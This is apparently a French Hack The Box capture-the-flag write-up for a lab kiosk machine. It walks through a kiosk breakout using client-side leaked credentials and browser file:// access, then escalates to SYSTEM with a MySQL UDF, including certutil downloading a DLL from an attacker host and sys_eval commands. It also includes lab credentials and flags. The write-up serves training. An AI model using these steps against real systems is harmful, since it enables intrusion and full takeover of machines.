# HTB-Touch — Write-up complet ✅ ROOTED

> Borne d'enregistrement « HTB AIRWAYS ». Cible `KIOSK-042`, **Windows 11 / Server 2025 (Build 26100)**.
> **USER + ROOT obtenus.** Chaîne : DeviceHub (creds en clair côté client) → RDP kiosk → **breakout via navigateur** (`file://`) → user.txt → shell kioskuser → creds MySQL root → **UDF `lib_mysqludf_sys` installée à la main** → `sys_eval` en SYSTEM → root.txt.
> Données héritées de **Layover** : passager **Jenny Crawford** / réservation **KS7X2M**.

Légende : 🐉 Kali · 🌐 DeviceHub web (8443) · 🖥️ Kiosk RDP (3389 → Vite 5173) · 🐚 shell kioskuser · 👑 SYSTEM

---

## 0. Accès & identifiants

| Quoi | Valeur | Source |
|------|--------|--------|
| RDP / WinRM | `KioskUser` / `K!0sk2026#` | **JS client du dashboard DeviceHub** (`toggleCred`) |
| MDP web DeviceHub | `NX-DH-2024-B7042` (= serial) | indice + fuite `/api/status` |
| MySQL root | `root` / `HTB@irw4ys_DB!2026` | `C:\ProgramData\HTB Airways\refresh-dates.bat` |
| Passager | Jenny Crawford / **KS7X2M** | Layover |
| Badge staff | `auth_code` de `htb_airways._htb_staff` | ex. `B95FB54E61B9B4AC` |
| **ROOT FLAG** | `1796afacc6f365d7f391cb2b24deac97` | `C:\Users\Administrator\Desktop\root.txt` (via `sys_eval`) |

RDP = **RDP simple, pas de SSL** → `xfreerdp3 ... /sec:rdp`.

---

## 1. Recon
```bash
nmap -sV -sC -p- <IP>
```
| Port | Service | Note |
|------|---------|------|
| 135 | msrpc | RPC |
| 3389 | RDP | RemoteApp « Airport Kiosk » (allowlist stricte) |
| 5985 | WinRM | KioskUser s'auth mais `WinRMAuthorizationError` → pas de shell |
| 8443 | HTTP | **Nexion DeviceHub DH-100** |

---

## 2. Foothold → KioskUser
1. `GET /api/status` (non-auth) fuite le **serial** `NX-DH-2024-B7042`.
2. Login DeviceHub : mot de passe = **serial** (mdp par défaut du device).
3. Dashboard → **inspecter le JS** : les creds des devices sont livrées au client (`toggleCred(...,'K!0sk2026#')`) → **`KioskUser:K!0sk2026#`** (compte Windows).
4. RDP avec ces creds → session kiosk « HTB AIRWAYS ».

---

## 3. USER.TXT — breakout du kiosk

> Kiosk = app **Chromium/Vite** en RemoteApp verrouillé (allowlist stricte, `RAIL_EXEC_E_NOT_IN_ALLOWLIST` → pas de breakout RDP). Le breakout se fait **par l'UI**.

1. 🌐 DeviceHub → **Scanner → Power OFF**.
2. 🖥️ Kiosk : RECHERCHE `Crawford` + `KS7X2M` → **DOCUMENTS** → scan.
3. Scanner OFF → le kiosk affiche une **erreur + lien d'aide** → le clic **ouvre le navigateur (IE/Edge)**.
4. Dans le navigateur → **lecture de fichiers `file://`** :
   ```
   file:///C:/Users/KioskUser/Desktop/user.txt
   ```
   → **USER FLAG.** (Navigation libre de `C:\`.)

---

## 4. Shell + loot
- **Shell** : un fichier téléchargé via le navigateur ouvre l'**Explorateur** → barre d'adresse → `cmd` → **cmd interactif** (`kiosk-042\kioskuser`, Medium integrity).
- **Creds MySQL** dans `C:\ProgramData\HTB Airways\refresh-dates.bat` :
  ```
  C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "...refresh-dates.sql"
  ```
  → mdp root MySQL = **`HTB@irw4ys_DB!2026`**.
- Connexion : `C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026` → monitor MySQL 8.0.42.
- Bases (`SHOW DATABASES;`) : `htb_airways`, `nexion_devices` (+ systèmes `information_schema`, `mysql`, `performance_schema`, `sys`).
  - `htb_airways` (`SHOW TABLES;`) : `_htb_staff` → `auth_code` = **code du badge staff** (résout la Staff Authentication), + `bookings`, `passengers`, `boarding_passes`, `seat_assignments`, `flights`, etc.
  - `nexion_devices` : `devices` = KioskUser only.

> ⚠️ Rappel syntaxe : `SELECT ... FROM table;` (pas `FROM * SELECT *`). Terminer par `;`. `\c` pour annuler une saisie en cours (prompt `->`).

---

## 5. ROOT.TXT — UDF MySQL `sys_eval` en SYSTEM ✅

Le service MySQL tourne en **LocalSystem** → transformer `root@mysql` en exécution de commandes = **SYSTEM**. `sys_eval` n'est **pas** installé → on installe l'UDF `lib_mysqludf_sys` **soi-même**.

### 5.1 Vérifier le terrain (fait dans le monitor MySQL)
```sql
SELECT @@secure_file_priv, @@plugin_dir;
```
```
+--------------------+-----------------------+
| @@secure_file_priv | @@plugin_dir          |
+--------------------+-----------------------+
| NULL               | C:\MySQL\lib\plugin\  |
+--------------------+-----------------------+
```
> `secure_file_priv = NULL` → `LOAD_FILE`/`INTO DUMPFILE` **désactivés** → impossible d'écrire la DLL **via MySQL**. On la dépose donc **avec le shell** (autre canal). `plugin_dir` = `C:\MySQL\lib\plugin\` → c'est **là** que MySQL charge les UDF.

### 5.2 🐉 Kali — récupérer la DLL x64 et la servir (port 80)
```bash
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll ~/udf.dll
sudo python3 -m http.server 80
```
> **x64 obligatoire** : MySQL 8.0.42 est 64-bit → une DLL 32-bit échoue au `CREATE FUNCTION` (erreur d'architecture).

### 5.3 🐚 Box (shell kioskuser) — télécharger puis déposer dans le plugin_dir
`certutil` direct vers le plugin_dir peut coincer → **download dans `Downloads` puis `copy`** (chemin réellement utilisé) :
```cmd
certutil -urlcache -f http://<IP_KALI>/udf.dll %USERPROFILE%\Downloads\udf.dll
copy %USERPROFILE%\Downloads\udf.dll C:\MySQL\lib\plugin\udf.dll
dir C:\MySQL\lib\plugin\
```
> Vérif : `udf.dll` (~7 168 bytes) doit apparaître dans `C:\MySQL\lib\plugin\` **avant** de créer la fonction. `C:\MySQL` a des ACL larges → `copy` passe.

### 5.4 🐚 MySQL (root) — créer la fonction et exécuter
```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';   -- Query OK
SELECT sys_eval('whoami');
```
> `SONAME 'udf.dll'` = **nom de fichier seul**, pas de chemin : MySQL concatène `plugin_dir + nom`.
> Syntaxe : **parenthèses obligatoires** — `SELECT sys_eval('whoami');`. Sans `()` → `ERROR 1054 Unknown column 'sys_eval'` (interprété comme une colonne). Parenthèses impossibles au clavier (QWERTY/AZERTY) → **`osk`** ou Shift+9 / Shift+0.

**Sortie en hexadécimal** (comportement par défaut de MySQL pour le binaire) :
```
+----------------------------------------+
| 0x6E7420617574686F726974795C73797374656D |
+----------------------------------------+
```
Décodage → `6E 74 20 61 75 74 68 6F 72 69 74 79 5C 73 79 73 74 65 6D` = **`nt authority\system`** 👑

### 5.5 Lire le flag en clair — relance avec `--skip-binary-as-hex`
```cmd
C:\MySQL\bin\mysql.exe --skip-binary-as-hex -u root -pHTB@irw4ys_DB!2026 mysql
```
```sql
SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
```
```
+-------------------------------------------------------------+
| 1796afacc6f365d7f391cb2b24deac97                            |
+-------------------------------------------------------------+
```
→ **ROOT FLAG = `1796afacc6f365d7f391cb2b24deac97`** ✅

> `\\` doublé car `\` est le caractère d'échappement des chaînes MySQL.
> Alternative sans relance : garder le hex et décoder côté Kali → `echo -n '<hex_sans_0x>' | xxd -r -p`.

### 5.6 Nettoyage (bonne pratique)
```sql
DROP FUNCTION sys_eval;
```
```cmd
del C:\MySQL\lib\plugin\udf.dll
del %USERPROFILE%\Downloads\udf.dll
```

### ⚠️ Fausse piste (ne pas chasser)
`whoami /groups` montre `KIOSK-042\Printer Administrators` → **leurre**. Vérifié : aucun service/fichier writable (`accesschk`), Point-and-Print non vulnérable (`DriverRanking` only), batch non modifiable, pas de `SeImpersonate`. **Le vrai root = MySQL UDF.**

---

## 6. Chaîne complète
```
/api/status (serial) → login DeviceHub → JS client → KioskUser:K!0sk2026#
   → RDP kiosk → Scanner OFF → erreur + lien → navigateur → file:// → USER.TXT
   → Explorateur → cmd → refresh-dates.bat → MySQL root
   → SELECT @@secure_file_priv,@@plugin_dir (NULL / C:\MySQL\lib\plugin\)
   → certutil udf.dll → Downloads → copy vers plugin_dir
   → CREATE FUNCTION sys_eval → sys_eval('whoami') = SYSTEM (hex décodé)
   → relance --skip-binary-as-hex → sys_eval('type ...root.txt') → ROOT.TXT
```

## 7. Gotchas environnement (indispensables)
- RDP : `xfreerdp3 /u:KioskUser /p:'K!0sk2026#' /v:<IP> /cert:ignore /sec:rdp +clipboard /dynamic-resolution`
- **Clavier cassé** (QWERTY imposé vs AZERTY physique, `a/q z/w m` + `: / \ " ( )` décalés ; `/kbd:layout:0x40c` n'a pas corrigé) → **`osk`** (clavier visuel). Parenthèses = Shift+9 / Shift+0 en QWERTY. Pas de copier-coller fiable.
- cmd « Sélectionner » = QuickEdit → **Échap** avant de taper.
- certutil : `cd C:\Temp` échoue souvent (clavier) → télécharger **via le navigateur / `Downloads`** puis `copy`.
- **accesschk** (signé MS) passe Defender ; **winPEAS** se fait supprimer.
- MySQL : `@@secure_file_priv=NULL`, `@@plugin_dir=C:\MySQL\lib\plugin\`. Affichage lisible : `...\G`. Sortie binaire → `--skip-binary-as-hex` ou décodage hex.
- Appels UDF : **parenthèses obligatoires** (`sys_eval('cmd')`), sinon `ERROR 1054`.

## 8. Boîte à outils
`nmap` · `nxc` · `xfreerdp3`/`rdesktop` · navigateur (`file://`) · `certutil` · `mysql.exe` · `lib_mysqludf_sys_64.dll` (UDF) · `accesschk64` · `xxd` · `osk`

## 9. Concepts à retenir
- **Secrets côté client** : un bouton « show password » peut livrer le mot de passe déjà présent dans le HTML/JS → inspecter avant de chercher un exploit.
- **Kiosk breakout** : tout ce qui ouvre un navigateur / une boîte de dialogue = sortie potentielle (`file://`, Ctrl+O, Explorateur → `cmd`).
- **MySQL UDF privesc** : `root@mysql` + `mysqld` en SYSTEM → `lib_mysqludf_sys` (`sys_eval`/`sys_exec`) = RCE SYSTEM. Si `secure_file_priv` bloque `DUMPFILE`, déposer la DLL dans `plugin_dir` **par un autre canal** (shell).
- **Canal bloqué ≠ attaque bloquée** : chercher quel *autre* moyen fait le même travail.
- **Sortie hex MySQL** : binaire affiché en `0x...` → `--skip-binary-as-hex` ou `xxd -r -p`.
- Un **groupe custom** (`Printer Administrators`) peut être un **leurre** → toujours vérifier (accesschk) avant de s'y enfermer.